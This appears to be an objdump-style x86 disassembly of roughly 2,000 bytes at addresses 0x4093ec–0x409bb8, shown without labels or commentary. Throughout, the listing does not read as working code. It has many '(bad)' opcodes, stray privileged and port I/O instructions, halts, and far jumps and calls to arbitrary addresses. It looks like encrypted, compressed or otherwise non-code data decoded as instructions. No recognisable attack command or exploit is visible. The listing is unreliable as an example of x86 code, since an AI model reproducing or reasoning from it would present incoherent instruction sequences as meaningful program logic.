  4093ec:	and    ebx,DWORD PTR [edx+ebx*8-0xda6182c]
  4093f3:	and    DWORD PTR [ebx],esp
  4093f5:	jb     0x40942a
  4093f7:	mov    ?,ecx
  4093f9:	out    0x37,al
  4093fb:	mov    dh,0xca
  4093fd:	and    esi,DWORD PTR [eax+edx*2-0x67]
  409401:	in     al,dx
  409402:	test   BYTE PTR [edi],dl
  409404:	dec    esp
  409405:	adc    eax,DWORD PTR [eax+0x72c5b984]
  40940b:	adc    al,0xd0
  40940d:	jle    0x4093de
  40940f:	inc    eax
  409410:	add    eax,0xb5be68e7
  409415:	push   ecx
  409416:	pop    eax
  409417:	push   ebx
  409418:	pop    edx
  409419:	(bad)  
  40941a:	mov    WORD PTR [ebx+0x6b],fs
  40941d:	push   esp
  40941e:	(bad)  
  40941f:	jmp    ecx
  409421:	xor    al,0xb0
  409423:	imul   edx,DWORD PTR ds:0x1aa38bed,0x1f232e89
  40942d:	mov    ebp,ebx
  40942f:	shl    BYTE PTR [ecx-0x17],1
  409432:	ret    0x1097
  409435:	sbb    BYTE PTR [edi-0x7c],0x65
  409439:	call   DWORD PTR [edi]
  40943b:	call   0x9417c0e0
  409440:	aas    
  409441:	aaa    
  409442:	add    al,0x78
  409444:	jae    0x409434
  409446:	ret    0xa9ca
  409449:	jne    0x409476
  40944b:	sar    BYTE PTR [edx],1
  40944d:	retf   0xe8a
  409450:	sbb    BYTE PTR [ebx+0x506e3fc6],ch
  409456:	dec    eax
  409457:	cmp    al,0xec
  409459:	jmp    0x2bcb:0x563d8650
  409460:	aaa    
  409461:	cmp    edx,ebp
  409463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409464:	daa    
  409465:	jp     0x4094b6
  409467:	push   0x14
  409469:	repz push eax
  40946b:	jnp    0x4094ce
  40946d:	inc    ebp
  40946e:	ucomiss xmm6,DWORD PTR [edi]
  409471:	sub    bh,BYTE PTR [edx]
  409473:	adc    DWORD PTR [edx+0x6005e5e2],eax
  409479:	sub    eax,0x8345ca8e
  40947e:	mov    WORD PTR [edx-0x7e5aa9f0],gs
  409484:	pop    esp
  409485:	mov    ah,BYTE PTR [edx]
  409487:	cs fstp QWORD PTR cs:[edx-0x24]
  40948c:	adc    DWORD PTR [edi-0x69],esi
  40948f:	push   edx
  409490:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409491:	fiadd  WORD PTR [ebx]
  409493:	push   es
  409494:	clc    
  409495:	arpl   WORD PTR [ecx],bx
  409497:	loopne 0x40946f
  409499:	stos   BYTE PTR es:[edi],al
  40949a:	ja     0x409484
  40949c:	call   0x2826757a
  4094a1:	imul   esi,DWORD PTR [ebx],0xfd7d3861
  4094a7:	cmp    cl,BYTE PTR [esi-0x72]
  4094aa:	fcmovbe st,st(4)
  4094ac:	pusha  
  4094ad:	push   es
  4094ae:	test   al,0xc0
  4094b0:	pop    esp
  4094b1:	mov    edi,DWORD PTR [esi+0x5e47e087]
  4094b7:	lock lea edi,[eax-0x117613d7]
  4094be:	xor    DWORD PTR [esi+0x3b],edx
  4094c1:	sti    
  4094c2:	lods   al,BYTE PTR ds:[esi]
  4094c3:	pop    eax
  4094c4:	push   esp
  4094c5:	sbb    esi,esi
  4094c7:	pop    es
  4094c8:	loope  0x409544
  4094ca:	dec    eax
  4094cb:	in     eax,dx
  4094cc:	aad    0x20
  4094ce:	xchg   ebp,eax
  4094cf:	xor    ah,bl
  4094d1:	mov    WORD PTR [ebx+0x18],?
  4094d4:	cmp    eax,0x7c351e7d
  4094d9:	(bad)  
  4094da:	adc    BYTE PTR [ebx-0x38bf3b8],al
  4094e0:	aaa    
  4094e1:	ret    0x4cc5
  4094e4:	sbb    ah,al
  4094e6:	scas   eax,DWORD PTR es:[edi]
  4094e7:	shl    DWORD PTR ds:0x41aa72e4,0x51
  4094ee:	out    0xac,al
  4094f0:	dec    ecx
  4094f1:	mov    ch,0xa
  4094f3:	and    eax,0x574f1086
  4094f8:	mov    esp,0xa43df199
  4094fd:	fiadd  DWORD PTR [eax+0x12]
  409500:	pop    ss
  409501:	pop    ebx
  409502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409503:	int3   
  409504:	out    dx,al
  409505:	dec    esp
  409506:	test   al,0x4a
  409508:	addr16 (bad) 
  40950a:	or     eax,0x12469c98
  40950f:	and    al,0x4f
  409511:	pop    eax
  409512:	jbe    0x4094eb
  409514:	(bad)  
  409515:	je     0x40958b
  409517:	sbb    DWORD PTR [edi+0x22],edx
  40951a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40951b:	push   edx
  40951c:	jmp    0x40959c
  40951e:	pop    es
  40951f:	je     0x40959c
  409521:	shl    BYTE PTR cs:[edi+eax*2+0x3ebe4d30],1
  409529:	xor    ch,ah
  40952b:	fist   WORD PTR [edx+eiz*4-0x26]
  40952f:	pop    ecx
  409530:	push   cs
  409531:	adc    eax,0xc4f9f247
  409536:	push   esi
  409537:	push   edx
  409538:	cmp    al,0x66
  40953a:	sar    DWORD PTR [ebx+0x69],0xd8
  40953e:	push   esp
  40953f:	push   ebx
  409540:	fmul   DWORD PTR [eax-0x74913a2a]
  409546:	mov    ds:0x62646116,eax
  40954b:	jle    0x4094e6
  40954d:	das    
  40954e:	imul   ebp,DWORD PTR [eax+ebx*8-0x7e],0xffffffe5
  409553:	in     al,0x11
  409555:	push   ebx
  409556:	mov    esp,0x8b7a6214
  40955b:	jle    0x4095ca
  40955d:	add    al,0x64
  40955f:	cmp    bl,BYTE PTR [ebp+0x7b]
  409562:	sbb    edx,DWORD PTR [esi-0x6a]
  409565:	inc    esp
  409566:	mov    bh,BYTE PTR [esi]
  409568:	in     al,0x6e
  40956a:	lods   al,BYTE PTR ds:[esi]
  40956b:	mov    edx,0x5cc5ea26
  409570:	fcmovnbe st,st(2)
  409572:	pop    ds
  409573:	icebp  
  409574:	xchg   ebp,eax
  409575:	test   BYTE PTR [eax+esi*4+0x6ac3bbf4],ah
  40957c:	das    
  40957d:	out    0x73,eax
  40957f:	test   DWORD PTR [esi+0x70],ebx
  409582:	stc    
  409583:	out    dx,al
  409584:	sahf   
  409585:	loope  0x409526
  409587:	jnp    0x409515
  409589:	mov    dl,0x79
  40958b:	adc    eax,0xc1b8fe16
  409590:	cmp    ah,BYTE PTR [ecx+0x66356950]
  409596:	pusha  
  409597:	ffree  st(6)
  409599:	dec    esi
  40959a:	loop   0x4095aa
  40959c:	loop   0x4095f7
  40959e:	loop   0x4095cb
  4095a0:	pop    ebp
  4095a1:	push   ebx
  4095a2:	mov    ebp,ds
  4095a4:	repz mov bl,0x7a
  4095a7:	lods   al,BYTE PTR ds:[esi]
  4095a8:	jmp    0x3765:0x50d5dccb
  4095af:	out    0xa8,al
  4095b1:	xor    al,0x4f
  4095b3:	test   cl,al
  4095b5:	fwait
  4095b6:	test   BYTE PTR [ebp-0x1b],ch
  4095b9:	mov    edx,0x9fe59b52
  4095be:	xlat   BYTE PTR ds:[ebx]
  4095bf:	retf   
  4095c0:	add    BYTE PTR [edx+esi*2],cl
  4095c3:	cmp    DWORD PTR [edx+ebp*1+0xff30917],edx
  4095ca:	sub    DWORD PTR [ebx],0x8b5749bc
  4095d0:	dec    eax
  4095d1:	scas   eax,DWORD PTR es:[edi]
  4095d2:	adc    eax,0x396b1096
  4095d7:	popa   
  4095d8:	jb     0x4095b5
  4095da:	scas   eax,DWORD PTR es:[edi]
  4095db:	sub    eax,0x64de1530
  4095e0:	sub    dl,BYTE PTR [esi]
  4095e2:	mov    ?,WORD PTR [edx]
  4095e4:	popf   
  4095e5:	pop    ss
  4095e6:	call   0xbcad69b8
  4095eb:	push   esi
  4095ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095ee:	fld    DWORD PTR [ecx-0x45]
  4095f1:	jbe    0x40958a
  4095f3:	js     0x4095cf
  4095f5:	or     BYTE PTR [edi],ah
  4095f7:	cld    
  4095f8:	push   cs
  4095f9:	or     ecx,DWORD PTR [edx-0x24]
  4095fc:	data16 fidivr WORD PTR [ecx-0x7d7854fe]
  409603:	jmp    0xb686:0xc7de3177
  40960a:	arpl   si,sp
  40960c:	mov    DWORD PTR [eax+ebx*1+0x48],0x763d4356
  409614:	jmp    0x40968d
  409616:	push   ds
  409617:	mov    eax,0x56d93f5c
  40961c:	rcl    BYTE PTR [eax+0x62],1
  40961f:	jns    0x409624
  409621:	les    eax,FWORD PTR [edx-0x2]
  409624:	mov    cl,0x88
  409626:	test   DWORD PTR [ebx-0xb033bbb],esi
  40962c:	sbb    edi,DWORD PTR [ecx+0xd]
  40962f:	xchg   esi,eax
  409630:	pop    ebx
  409631:	mov    BYTE PTR [ecx+0xa],al
  409634:	mov    dh,0x15
  409636:	aas    
  409637:	call   0x926c:0x50131fc7
  40963e:	imul   edi,DWORD PTR [eax-0x44],0xffffffaf
  409642:	dec    ebx
  409643:	cs (bad) 
  409645:	jb     0x4095e1
  409647:	pop    esp
  409648:	or     dh,al
  40964a:	jmp    0x6fb4b1d6
  40964f:	(bad)  
  409650:	ffreep st(6)
  409652:	mov    ds:0xa45a3ad8,al
  409657:	and    al,BYTE PTR [eax-0x2437911c]
  40965d:	mov    eax,0xed56a96c
  409662:	call   0x6277:0x9d412c77
  409669:	add    al,0x6d
  40966b:	imul   esp,ebx,0x74
  40966e:	cld    
  40966f:	mov    ds:0xf2d71296,eax
  409674:	push   eax
  409675:	out    dx,al
  409676:	leave  
  409677:	sti    
  409678:	cmp    al,0xc3
  40967a:	lods   al,BYTE PTR ds:[esi]
  40967b:	xchg   ecx,eax
  40967c:	mov    BYTE PTR [eax+0x2a],ch
  40967f:	sahf   
  409680:	xlat   BYTE PTR ds:[ebx]
  409681:	xchg   ebp,eax
  409682:	xor    DWORD PTR [ebx+0x3e3d730d],eax
  409688:	into   
  409689:	pop    ebp
  40968a:	jl     0x4096fb
  40968c:	adc    eax,0xb53acb39
  409691:	push   esp
  409692:	jmp    0xdca7:0x94aafaf5
  409699:	out    0x16,eax
  40969b:	inc    ecx
  40969c:	ret    0x4837
  40969f:	mov    esi,0x4cf969c9
  4096a4:	leave  
  4096a5:	ficomp WORD PTR [ebx+0x5]
  4096a8:	fisub  WORD PTR [ebx+0x61]
  4096ab:	or     al,0xb0
  4096ad:	pop    ebx
  4096ae:	add    eax,0x3dca2cc6
  4096b3:	jb     0x4096c8
  4096b5:	ss dec edx
  4096b7:	bswap  ecx
  4096b9:	test   eax,0x3302751c
  4096be:	repnz push ds
  4096c0:	push   ss
  4096c1:	xlat   BYTE PTR ds:[ebx]
  4096c2:	dec    eax
  4096c3:	add    ch,0x84
  4096c6:	mov    edx,0xdde359a5
  4096cb:	in     eax,0xc4
  4096cd:	(bad)  
  4096ce:	sub    BYTE PTR [ebp-0xf],al
  4096d1:	or     BYTE PTR [ebx-0x6a],0xfe
  4096d5:	add    al,0x65
  4096d7:	jl     0x409691
  4096d9:	sub    cl,BYTE PTR ds:0x263018e4
  4096df:	or     edx,DWORD PTR [edi+0x38]
  4096e2:	in     eax,dx
  4096e3:	push   ss
  4096e4:	add    bl,0xb7
  4096e7:	neg    BYTE PTR [edx+0xd]
  4096ea:	shl    DWORD PTR [esi+eiz*4-0x512f2565],0x83
  4096f2:	xlat   BYTE PTR ds:[ebx]
  4096f3:	xchg   BYTE PTR [ecx],dh
  4096f5:	xor    al,0x28
  4096f7:	out    0x5e,eax
  4096f9:	mov    BYTE PTR [ebx-0x23ef7335],al
  4096ff:	ja     0x40972f
  409701:	cmp    al,0xf5
  409703:	and    eax,0xd9c641a8
  409708:	out    0x69,al
  40970a:	sub    esp,esp
  40970c:	push   edi
  40970d:	lds    esi,FWORD PTR [ecx+ecx*2-0x67]
  409711:	rol    BYTE PTR [ebx+0x12],0xe0
  409715:	jae    0x409699
  409717:	test   DWORD PTR [edi-0x68],edi
  40971a:	jns    0x409760
  40971c:	and    bl,BYTE PTR [ebx]
  40971e:	xchg   edx,eax
  40971f:	push   es
  409720:	dec    edi
  409721:	add    BYTE PTR [edx+0x30],cl
  409724:	inc    ebp
  409725:	cmp    al,BYTE PTR [ebp+0x13]
  409728:	inc    eax
  409729:	cli    
  40972a:	mov    cl,0xd5
  40972c:	int    0x96
  40972e:	inc    edi
  40972f:	aam    0x7d
  409731:	mov    cl,0x10
  409733:	lock mov eax,ds:0x6cd2e24e
  409739:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40973a:	mov    dh,0x77
  40973c:	int    0x7e
  40973e:	cmp    DWORD PTR [esi-0x5e],ebp
  409741:	out    0x15,al
  409743:	xchg   ebx,eax
  409744:	scas   al,BYTE PTR es:[edi]
  409745:	mov    BYTE PTR [eax+eax*8-0x32e734da],cl
  40974c:	cmp    al,0x43
  40974e:	dec    esi
  40974f:	and    edi,DWORD PTR [eax+0x10]
  409752:	xor    esi,DWORD PTR [edx]
  409754:	hlt    
  409755:	pop    edi
  409756:	jno    0x4096f6
  409758:	int    0xe8
  40975a:	leave  
  40975b:	in     eax,0x95
  40975d:	ror    DWORD PTR [ebx+0x52],cl
  409760:	xor    esi,ebx
  409762:	sbb    al,0x3b
  409764:	xlat   BYTE PTR ds:[ebx]
  409765:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409766:	cwde   
  409767:	mov    ds:0xd908cf67,eax
  40976c:	mul    DWORD PTR [ecx+0x4c]
  40976f:	clc    
  409770:	jb     0x4097d7
  409772:	sbb    ebx,DWORD PTR [ebp+0x59]
  409775:	call   0xc9b068bc
  40977a:	jmp    0xd93c6740
  40977f:	or     DWORD PTR [esp+ebx*1],ecx
  409782:	icebp  
  409783:	arpl   WORD PTR ds:0xadeb4198,sp
  409789:	xchg   edi,eax
  40978a:	xchg   esp,eax
  40978b:	cdq    
  40978c:	adc    ebp,DWORD PTR [edx+0x760cf4db]
  409792:	pushf  
  409793:	dec    esp
  409794:	pcmpgtb mm4,QWORD PTR [edx+esi*2]
  409798:	adc    DWORD PTR [esi],ebx
  40979a:	stos   DWORD PTR es:[edi],eax
  40979b:	mov    eax,0xfcc3d272
  4097a0:	cmp    DWORD PTR [edx-0x851e78c],ebx
  4097a6:	mov    edx,0x24d48bab
  4097ab:	fld    DWORD PTR [eax]
  4097ad:	pop    edi
  4097ae:	push   cs
  4097af:	xor    bh,cl
  4097b1:	jnp    0x4097aa
  4097b3:	push   ecx
  4097b4:	mov    BYTE PTR [ebp+0x6dac0aa1],ah
  4097ba:	pop    ecx
  4097bb:	or     edi,DWORD PTR [ecx+edx*2]
  4097be:	test   DWORD PTR [ebp-0x38],esi
  4097c1:	and    edx,DWORD PTR [esi-0x259688]
  4097c7:	mov    esp,0x83ad5ec9
  4097cc:	mov    ebx,0x8e29c395
  4097d1:	jno    0x40977b
  4097d3:	or     DWORD PTR [eax-0x586c4d8a],0x1732aa20
  4097dd:	push   ds
  4097de:	shl    DWORD PTR [edi],0x99
  4097e1:	mov    bh,0xd5
  4097e3:	jns    0x409862
  4097e5:	dec    edi
  4097e6:	stc    
  4097e7:	(bad)  
  4097e8:	int    0x9b
  4097ea:	ficomp WORD PTR [edi-0x3a]
  4097ed:	xchg   edi,eax
  4097ee:	pop    es
  4097ef:	mov    ch,0x5a
  4097f1:	das    
  4097f2:	xchg   edx,eax
  4097f3:	mov    dl,0x2
  4097f5:	lahf   
  4097f6:	pusha  
  4097f7:	(bad)  
  4097f8:	fiadd  DWORD PTR [edi-0x5]
  4097fb:	fld    TBYTE PTR [eax+0x6c09d9ed]
  409801:	and    eax,0xc164f873
  409806:	aam    0xc0
  409808:	push   edi
  409809:	mov    DWORD PTR [ebp+0x5277da8b],esp
  40980f:	mov    eax,0x98f43c89
  409814:	pop    ds
  409815:	jle    0x4097b3
  409817:	push   esi
  409818:	lods   eax,DWORD PTR ds:[esi]
  409819:	add    BYTE PTR [edi-0x3a6948a],ah
  40981f:	mov    WORD PTR [edx-0x7f],cs
  409822:	or     ebp,DWORD PTR [ebx+0x3b]
  409825:	and    ebp,DWORD PTR [eax]
  409827:	inc    eax
  409828:	inc    ecx
  409829:	and    bl,cl
  40982b:	adc    BYTE PTR [ebx+ecx*1-0x64030ca7],al
  409832:	push   edi
  409833:	daa    
  409834:	addr16 mov cl,0x7b
  409837:	js     0x40986c
  409839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40983a:	pop    es
  40983b:	xor    cl,BYTE PTR [ebx]
  40983d:	mov    DWORD PTR [ebp-0x1905ea98],eax
  409843:	or     al,0xe3
  409845:	mov    edx,DWORD PTR [edx-0x2451082]
  40984b:	ret    
  40984c:	push   0x6ce1f51f
  409851:	outs   dx,DWORD PTR ds:[esi]
  409852:	and    dl,BYTE PTR [edi-0x2]
  409855:	xor    al,0xca
  409857:	test   DWORD PTR [edi],eax
  409859:	cmp    al,0x1d
  40985b:	push   edx
  40985c:	jnp    0x4097ee
  40985e:	test   cl,dh
  409860:	(bad)  
  409861:	and    BYTE PTR [ebx+0x71],dl
  409864:	ret    0x6f05
  409867:	bound  ebp,QWORD PTR [ecx-0x7c7f7a12]
  40986d:	fst    QWORD PTR [esi+eax*1-0x58]
  409871:	scas   al,BYTE PTR es:[edi]
  409872:	lock mov al,ds:0xfec597c3
  409878:	cmp    al,BYTE PTR [ebx]
  40987a:	aaa    
  40987b:	mov    bl,0xdd
  40987d:	(bad)  
  40987e:	push   ss
  40987f:	mov    ds:0xdc2d4b1,al
  409884:	and    esi,ecx
  409886:	inc    edi
  409887:	push   ebp
  409888:	bound  esp,QWORD PTR [ebp-0x5]
  40988b:	lahf   
  40988c:	inc    eax
  40988d:	std    
  40988e:	or     ecx,edi
  409890:	sbb    BYTE PTR [ecx-0x12],bl
  409893:	push   0xffffff87
  409895:	pusha  
  409896:	inc    eax
  409897:	lods   al,BYTE PTR ds:[esi]
  409898:	xor    DWORD PTR [edi+0x37],ecx
  40989b:	push   DWORD PTR [eax+0x4b]
  40989e:	push   ebp
  40989f:	mov    DWORD PTR [edi+0x714580e2],eax
  4098a5:	push   esi
  4098a6:	or     BYTE PTR [edx-0x7117c3ef],bl
  4098ac:	outs   dx,BYTE PTR ds:[esi]
  4098ad:	fcmovb st,st(0)
  4098af:	push   edi
  4098b0:	imul   esi,ebx,0x86347aa8
  4098b6:	or     BYTE PTR [esi+edx*1+0x2e],al
  4098ba:	jge    0x4098c1
  4098bc:	mov    ch,0xf7
  4098be:	and    BYTE PTR [ecx],ah
  4098c0:	xor    DWORD PTR [ecx],0xffffffa4
  4098c3:	sahf   
  4098c4:	icebp  
  4098c5:	inc    ebp
  4098c6:	xchg   DWORD PTR [ebx],eax
  4098c8:	sub    al,0x20
  4098ca:	mov    ecx,esi
  4098cc:	retf   0xd49f
  4098cf:	fstp   TBYTE PTR [esi+0x59f7693]
  4098d5:	cmp    BYTE PTR [ebx],bh
  4098d7:	mov    eax,0xa639113f
  4098dc:	sub    BYTE PTR [ebx+0x46],ah
  4098df:	cwde   
  4098e0:	xor    ch,BYTE PTR [edx+0x76c5b3cf]
  4098e6:	ds or  eax,0xc94cb33
  4098ec:	xchg   ebp,eax
  4098ed:	inc    edi
  4098ee:	sub    cl,al
  4098f0:	jg     0x409951
  4098f2:	jne    0x4098de
  4098f4:	clc    
  4098f5:	jnp    0x4098e1
  4098f7:	outs   dx,DWORD PTR ds:[esi]
  4098f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098f9:	(bad)  
  4098fb:	addr16 je 0x4098fe
  4098fe:	aad    0x3b
  409900:	fnstcw WORD PTR [ebx-0x3c]
  409903:	inc    ecx
  409904:	or     bh,0xc6
  409907:	loope  0x4098c5
  409909:	iret   
  40990a:	xchg   esi,eax
  40990b:	enter  0xabcd,0xc7
  40990f:	cmp    ebp,DWORD PTR [ebx-0x40fc7a7a]
  409915:	imul   edx,edx,0x7b
  409918:	jns    0x943bea79
  40991e:	mov    edi,0x46bc849
  409923:	dec    edx
  409924:	add    edi,DWORD PTR [esi-0x1f]
  409927:	inc    esi
  409928:	iret   
  409929:	sbb    cl,BYTE PTR [esp+esi*1+0x2ebd44cf]
  409930:	add    DWORD PTR [edx],esp
  409932:	sub    ah,dl
  409934:	daa    
  409935:	rcl    DWORD PTR [ecx*2+0x3c2084bd],1
  40993c:	pop    ecx
  40993d:	iret   
  40993e:	inc    eax
  40993f:	dec    edx
  409940:	fild   WORD PTR [ecx]
  409942:	cmp    BYTE PTR [ecx-0x6f],0x70
  409946:	push   esi
  409947:	push   ds
  409948:	adc    ebx,DWORD PTR ds:0x70010c8f
  40994e:	(bad)  
  40994f:	out    dx,al
  409950:	in     eax,dx
  409951:	cmp    al,BYTE PTR [eax]
  409953:	mov    esi,0xf45f6f6e
  409958:	mov    dl,0xa1
  40995a:	and    BYTE PTR [ebx+esi*1+0x409fb557],0x8f
  409962:	mov    ?,WORD PTR [ebx]
  409964:	popf   
  409965:	ror    BYTE PTR [eax+0x74f1c5fe],1
  40996b:	data16 add BYTE PTR es:[esi+ecx*1],0x9e
  409971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409972:	ret    
  409973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409974:	lock sbb edi,DWORD PTR [ecx-0x74c86621]
  40997b:	outs   dx,BYTE PTR ds:[si]
  40997d:	xchg   ebx,eax
  40997e:	scas   eax,DWORD PTR es:[edi]
  40997f:	arpl   WORD PTR [edx+0x3a3e3d40],bx
  409985:	rol    DWORD PTR [ebp+0x1],1
  409988:	adc    esi,ebp
  40998a:	aaa    
  40998b:	and    DWORD PTR [ebp+0x49],0xb650bf30
  409992:	dec    edi
  409993:	adc    al,0xd
  409995:	mov    edi,DWORD PTR [ecx]
  409997:	pop    ebx
  409998:	pop    ebp
  409999:	adc    eax,0xff4d547a
  40999e:	add    DWORD PTR [edi+0x78d2002e],edx
  4099a4:	mov    esi,0x178ef9ae
  4099a9:	pop    edi
  4099aa:	repz cmp eax,0xe0ded71f
  4099b0:	shr    DWORD PTR [ebx-0x63b2288b],cl
  4099b6:	push   es
  4099b7:	mov    BYTE PTR [esi-0x7e5a7378],ch
  4099bd:	les    esp,FWORD PTR [ebx+0x7d72d79d]
  4099c3:	cs dec edx
  4099c5:	aaa    
  4099c6:	repz mov eax,ds:0xd458a2f6
  4099cc:	adc    eax,0x881c6087
  4099d1:	push   ss
  4099d2:	int3   
  4099d3:	xchg   esi,eax
  4099d4:	dec    esp
  4099d5:	push   eax
  4099d6:	shr    ecx,0xa1
  4099d9:	pop    esi
  4099da:	or     eax,esp
  4099dc:	sbb    cl,BYTE PTR [ebp-0x1a6dff69]
  4099e2:	shl    BYTE PTR [esi],cl
  4099e4:	sub    DWORD PTR [edi],esi
  4099e6:	push   es
  4099e7:	xchg   ecx,eax
  4099e8:	call   0xe5c5:0xf9e1b20d
  4099ef:	sbb    eax,0x9384bffe
  4099f4:	shl    BYTE PTR [ebx+edi*2+0xec91dfb],1
  4099fb:	or     ecx,DWORD PTR [ecx+0x7f]
  4099fe:	push   edi
  4099ff:	mov    ah,0x60
  409a01:	cdq    
  409a02:	aam    0x71
  409a04:	adc    al,0x7d
  409a06:	(bad)  
  409a07:	mov    ebx,0x8103f868
  409a0c:	sbb    bh,BYTE PTR [eax+0x61]
  409a0f:	fmul   DWORD PTR [eax-0x7cadc254]
  409a15:	je     0x4099a9
  409a17:	test   eax,0x2f71b33b
  409a1c:	pop    ss
  409a1d:	or     dh,bl
  409a1f:	mov    ds:0x905a24b3,al
  409a24:	popa   
  409a25:	nop
  409a26:	sti    
  409a27:	sti    
  409a28:	dec    edi
  409a29:	pop    ss
  409a2a:	sub    bh,BYTE PTR [edi]
  409a2c:	xchg   esi,eax
  409a2d:	je     0x409a99
  409a2f:	sub    BYTE PTR [ebx+0x30],0x9f
  409a33:	mov    cl,0x5c
  409a35:	loop   0x409a20
  409a37:	jmp    FWORD PTR [ecx+0x45]
  409a3a:	fadd   QWORD PTR [edx+0x3e]
  409a3d:	retf   
  409a3e:	leave  
  409a3f:	xchg   edi,eax
  409a40:	jne    0x409a4e
  409a42:	xor    cl,cl
  409a44:	adc    DWORD PTR [esi-0x14],ebx
  409a47:	out    dx,al
  409a48:	xor    eax,DWORD PTR [edi+0x49687847]
  409a4e:	jns    0x409a53
  409a50:	mov    ah,0x4f
  409a52:	add    BYTE PTR [eax+ebp*4-0x70ae650f],dh
  409a59:	mov    bl,0xd6
  409a5b:	test   DWORD PTR [ebx+0x46],edx
  409a5e:	mul    bl
  409a60:	addr16 enter 0x38e7,0x25
  409a65:	out    0x50,eax
  409a67:	aad    0x44
  409a69:	push   ss
  409a6a:	cld    
  409a6b:	in     al,dx
  409a6c:	repz (bad) 
  409a6f:	stos   DWORD PTR es:[edi],eax
  409a70:	jns    0x409a53
  409a72:	dec    ebx
  409a73:	call   0x80124fc4
  409a78:	and    cl,BYTE PTR [edi-0x49]
  409a7b:	test   BYTE PTR ds:0x460206fa,0x9
  409a82:	xchg   esi,eax
  409a83:	(bad)  
  409a84:	adc    eax,0x8a8f9f65
  409a89:	xchg   BYTE PTR [ecx+0x12946042],cl
  409a8f:	xchg   edx,eax
  409a90:	xor    bh,BYTE PTR [edx+0x4ac046e7]
  409a96:	pop    ss
  409a97:	sub    al,0x32
  409a99:	dec    esp
  409a9a:	mov    ch,0xb3
  409a9c:	jne    0x409a70
  409a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aa0:	std    
  409aa1:	and    esi,DWORD PTR [eax-0xf73bc97]
  409aa7:	pushf  
  409aa8:	or     BYTE PTR [ecx+0x74668729],ch
  409aae:	in     eax,0x63
  409ab0:	and    BYTE PTR ds:0x224be830,dh
  409ab6:	mov    cl,0x73
  409ab8:	out    dx,al
  409ab9:	std    
  409aba:	mov    eax,0x4020f4c7
  409abf:	arpl   WORD PTR [ebp+0x5864d0f8],bp
  409ac5:	hlt    
  409ac6:	mov    eax,0xfd7b6001
  409acb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409acc:	(bad)
  409ad0:	jns    0x409aae
  409ad2:	xchg   BYTE PTR [edx+0x3c],bh
  409ad5:	cmc    
  409ad6:	cmp    esi,esp
  409ad8:	out    dx,al
  409ad9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ada:	dec    BYTE PTR [ebx]
  409adc:	loop   0x409a65
  409ade:	cmp    edi,esi
  409ae0:	test   dh,dh
  409ae2:	sub    ebx,edx
  409ae4:	push   esi
  409ae5:	sub    al,0x63
  409ae7:	sbb    bh,bh
  409ae9:	xor    al,0x43
  409aeb:	test   eax,0x79068de1
  409af0:	mov    edi,esi
  409af2:	and    eax,0x8794b4e6
  409af7:	mov    ch,BYTE PTR [edi]
  409af9:	mov    DWORD PTR [ebx+ebx*2],ecx
  409afc:	mov    ebp,fs
  409afe:	mov    edx,0x6bb1c56f
  409b03:	retf   
  409b04:	pop    esp
  409b05:	and    BYTE PTR [ecx],0x37
  409b08:	push   edi
  409b09:	sbb    edx,DWORD PTR [ebp+eiz*8-0x59f0eb1f]
  409b10:	fldenv ds:0x17d353c9
  409b16:	push   cs
  409b17:	sbb    DWORD PTR [eax],ecx
  409b19:	ins    DWORD PTR es:[edi],dx
  409b1a:	cmp    edx,DWORD PTR [ebp+0x36db743e]
  409b20:	fwait
  409b21:	jbe    0x409b81
  409b23:	mov    esi,0xcd6ff390
  409b28:	cmp    DWORD PTR [edx-0x5e82291],esi
  409b2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b2f:	mov    BYTE PTR [ecx+0x4f],al
  409b32:	mov    cl,0x37
  409b34:	test   al,0x83
  409b36:	fsubp  st(6),st
  409b38:	sub    eax,0x2393809f
  409b3d:	sub    DWORD PTR [ebx],0x53
  409b40:	push   ds
  409b41:	sbb    ecx,DWORD PTR gs:[edi+esi*4-0x5dd1f315]
  409b49:	jo     0x409b29
  409b4b:	sbb    al,ch
  409b4d:	lds    eax,FWORD PTR [ecx]
  409b4f:	ins    DWORD PTR es:[edi],dx
  409b50:	and    dl,BYTE PTR [ecx]
  409b52:	das    
  409b53:	shl    BYTE PTR [edi+ecx*1],1
  409b56:	adc    DWORD PTR [ebx+0x24],edx
  409b59:	mov    ecx,0x2aa76ece
  409b5e:	rol    BYTE PTR [ecx],0xaa
  409b61:	sar    BYTE PTR [ecx+0x7],1
  409b64:	or     BYTE PTR [edx-0x14],dh
  409b67:	xor    ebx,DWORD PTR [ebp-0x1f1556c3]
  409b6d:	cmp    DWORD PTR [edx],0x1a60b938
  409b73:	nop
  409b74:	popf   
  409b75:	aam    0x66
  409b77:	dec    edx
  409b78:	enter  0x747d,0x1b
  409b7c:	call   0x9cd6:0xd85a146b
  409b83:	loopne 0x409b9f
  409b85:	test   BYTE PTR [edx],0x2e
  409b88:	js     0x409bc2
  409b8a:	cmp    eax,0x78e73a76
  409b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b90:	fidivr DWORD PTR [ecx-0x5e]
  409b93:	aad    0x3e
  409b95:	lahf   
  409b96:	and    ecx,DWORD PTR [edx]
  409b98:	or     BYTE PTR [esi+eiz*4-0x556b6345],bl
  409b9f:	cwde   
  409ba0:	and    eax,0x7bc27d76
  409ba5:	inc    edi
  409ba6:	sbb    dh,ah
  409ba8:	cdq    
  409ba9:	cmp    dl,BYTE PTR [ecx+0x5a3eeb66]
  409baf:	bound  ebx,QWORD PTR [edx-0x13]
  409bb2:	pop    esp
  409bb3:	xor    bh,0xa4
  409bb6:	sbb    cl,bh
  409bb8:	imul   edi,DWORD PTR [esi+ecx*2],0x55
